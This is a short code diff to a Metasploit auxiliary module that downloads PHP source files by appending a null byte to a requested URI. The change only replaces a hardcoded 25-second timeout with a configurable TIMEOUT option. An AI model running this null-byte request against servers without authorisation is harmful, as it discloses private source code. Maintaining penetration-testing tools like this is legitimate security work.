@@ -34,14 +34,19 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
-        OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
+        OptString.new('URI', [ true, 'Specify the path to download the file (ex: admin.php)', '/admin.php' ]),
+        OptString.new('PATH_SAVE', [ true, 'The path to save the downloaded source code', '' ]),
+        OptInt.new('TIMEOUT', [ true, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
   end
 
   def target_url
     uri = normalize_uri(datastore['URI'])
     "http://#{vhost}:#{rport}#{datastore['URI']}"
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(ip)
@@ -58,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
       res = send_request_raw({
         'method'  => 'GET',
         'uri'     => "#{uri}#{nullbytetxt}",
-      }, 25)
+      }, timeout)
 
       if res.nil?
         print_error("#{target_url} - Connection timed out")
